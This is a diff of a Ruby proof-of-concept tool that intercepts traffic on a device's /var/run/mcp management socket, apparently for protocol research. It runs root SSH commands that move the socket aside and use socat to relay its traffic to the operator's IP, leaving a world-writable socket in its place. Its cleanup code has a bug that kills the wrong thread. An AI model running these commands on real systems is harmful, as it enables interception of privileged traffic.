@@ -1,55 +1,39 @@
-# Kinda from https://gist.github.com/rdp/4956520
-
 require 'socket'
 require './mcp-parser'
 
-if ARGV.length != 3
-  $stderr.puts "Usage: mcp-mitm.rb <listen port> <upstream host> <upstream port>"
-  exit 1
+ME = "10.0.0.146"
+TARGET = "10.0.0.136"
+PORT1 = 1234
+PORT2 = 1235
+DO_SETUP = true
+
+LISTENER1 = TCPServer.new(PORT1)
+LISTENER2 = TCPServer.new(PORT2)
+
+puts "Configuration (edit the script to change, this is a PoC!):"
+puts
+puts "Your IP: #{ ME }"
+puts "Target IP: #{ TARGET }"
+puts "Listening port 1: #{ PORT1 }"
+puts "Listening port 2: #{ PORT2 }"
+puts "SSH into the target to set things up: #{ DO_SETUP }"
+if DO_SETUP
+  puts "  (Make sure you can ssh into the host as root with no password)"
+  puts "  (Yes yes, I know it's a PoC!)"
 end
 
-LISTEN, UPSTREAM_HOST, UPSTREAM_PORT = (ARGV[0] || 1234).to_i, ARGV[1] || 'f5', (ARGV[2] || 1234).to_i
+def handle(s1, s2)
+  $stderr.puts
+  $stderr.puts '---------------------------------------------------'
+  $stderr.puts
+  $stderr.puts "Received session @ #{ s1 } <--> #{ s2 }"
 
-# This can go in either direction
-# def handler(incoming, outgoing)
-#   $stderr.puts "Reading header"
-#   header = incoming.read(16)
-#   if header.nil?
-#     raise "Stream closed"
-#   end
-
-#   if header.length < 16
-#     raise "Didn't receive the full header!"
-#   end
-
-#   packet_length = header.unpack('N').pop
-
-#   $stderr.puts "Reading #{ packet_length }-byte body"
-#   packet = incoming.read(packet_length)
-
-#   begin
-#     parse(packet)
-#   rescue StandardError => e
-#     $stderr.puts "Error parsing message: #{ e }"
-#   ensure
-#     outgoing.write(header + packet)
-#   end
-# end
-
-listener = TCPServer.new(LISTEN)
-
-while(new_socket = listener.accept())
-  $stderr.puts "Received connection @ #{ new_socket }"
-
-  Thread.new(new_socket) do |s1|
+  Thread.new([s1, s2]) do |s|
     begin
-      $stderr.puts "Connecting upstream: #{ UPSTREAM_HOST }:#{ UPSTREAM_PORT }"
-      s2 = TCPSocket.new(UPSTREAM_HOST, UPSTREAM_PORT)
-      $stderr.puts "Connected upstream @ #{ s2 }!"
-
+      # Get the two sockets
+      s1, s2 = s
 
       eof = [false, false]
-      s = [s1, s2]
       read_array = [s1, s2]
       header = ['', '']
       body = ['', '']
@@ -66,8 +50,12 @@ while(new_socket = listener.accept())
 
       while(true) do
         if s1.closed? && s2.closed?
-          $stderr.puts "Both sockets closed or EOF"
-          break
+          #$stderr.puts "Both sockets closed or EOF"
+          return
+        end
+
+        if eof == [true, true]
+          return
         end
 
         r, _, e = IO.select(read_array, nil, s)
@@ -79,13 +67,13 @@ while(new_socket = listener.accept())
         0.upto(1) do |i|
           if r && r.include?(s[i])
             if s[i].eof?
-              $stderr.puts "#{ s[i] } :: Reached EOF, will no longer read"
+              #$stderr.puts "#{ s[i] } :: Reached EOF, will no longer read"
               read_array.delete(s[i])
               next
             end
 
             if header[i].length < 16
-              $stderr.puts "#{ s[i] } :: Receiving header"
+              #$stderr.puts "#{ s[i] } :: Receiving header"
               data = s[i].read_nonblock(16 - header[i].length())
               if data.nil?
                 raise "#{ s[i] } :: Socket closed"
@@ -93,19 +81,21 @@ while(new_socket = listener.accept())
               header[i] += data
 
               if header[i].length == 16
-                $stderr.puts "#{ s[i] } :: Received full header!"
+                #$stderr.puts "#{ s[i] } :: Received full header!"
                 length[i] = header[i].unpack('N').pop
               end
             else
-              $stderr.puts "#{ s[i] } :: Receiving body"
+              #$stderr.puts "#{ s[i] } :: Receiving body"
               data = s[i].read_nonblock(length[i] - body[i].length)
               if data.nil?
                 raise "#{ s[i] } :: socket closed"
               end
               body[i] += data
               if body[i].length == length[i]
-                $stderr.puts "#{ s[i] } :: Received full body! Writing it to #{ s[(i + 1) % 2] }"
+                #$stderr.puts "#{ s[i] } :: Received full body! Writing it to #{ s[(i + 1) % 2] }"
                 s[(i + 1) % 2].write_nonblock(header[i] + body[i])
+
+                puts
                 parse(body[i])
                 $stdout.flush()
                 header[i] = ''
@@ -119,6 +109,7 @@ while(new_socket = listener.accept())
     rescue StandardError => e
       $stderr.puts "Error: #{ e }"
     ensure
+      $stderr.puts "Ending thread"
       if !s1.nil?
         s1.close()
       end
@@ -126,5 +117,60 @@ while(new_socket = listener.accept())
         s2.close()
       end
     end
+  end
+end
+
+begin
+  # If we are doing setup, get things going (note: this breaks the server)
+  if DO_SETUP
+    puts "SSH'ing into the server to set things up"
+    system("ssh root@#{TARGET} mv /var/run/mcp /var/run/mcp2")
+
+    CONNECTION1 = Thread.new do
+      system "ssh root@#{TARGET} socat -t100 TCP-CONNECT:#{ME}:#{PORT1},reuseaddr,fork UNIX-CONNECT:/var/run/mcp2"
+      puts "Session 1 closed?"
+    end
+
+    CONNECTION2 = Thread.new do
+      system "ssh root@#{TARGET} socat -t100 UNIX-LISTEN:/var/run/mcp,mode=777,reuseaddr,fork TCP-CONNECT:#{ME}:#{PORT2}"
+      puts "Session 2 closed?"
+    end
+
+    puts "Ready!"
+  else
+    puts "You'll probably want to ssh into the host as root and run:"
+    puts
+    puts "# mv /var/run/mcp /var/run/mcp2"
+    puts "# socat -t100 TCP-CONNECT:#{ME}:#{PORT1},reuseaddr,fork UNIX-CONNECT:/var/run/mcp2"
+    puts "# socat -t100 UNIX-LISTEN:/var/run/mcp,mode=777,reuseaddr,fork TCP-CONNECT:#{ME}:#{PORT2}"
+    puts
+  end
+
+  loop do
+
+    s2 = LISTENER2.accept
+    #$stderr.puts "Received connection 2: #{s2}"
+
+    s1 = LISTENER1.accept
+    #$stderr.puts "Received connection 1: #{s1}"
+
+    handle(s1, s2)
+  end
+ensure
+  if DO_SETUP
+    puts "SSH'ing into the server to fix things"
+    system("ssh root@#{TARGET} mv /var/run/mcp2 /var/run/mcp")
+  else
+    puts "You'll probably want to see into the host as root and run:"
+    puts
+    puts "mv /var/run/mcp2 /var/run/mcp"
+  end
+
+  if Object.const_defined?(:CONNECTION1) && CONNECTION1
+    CONNECTION1.kill
+  end
+
+  if Object.const_defined?(:CONNECTION2) && CONNECTION2
+    CONNECTION1.kill
   end
 end
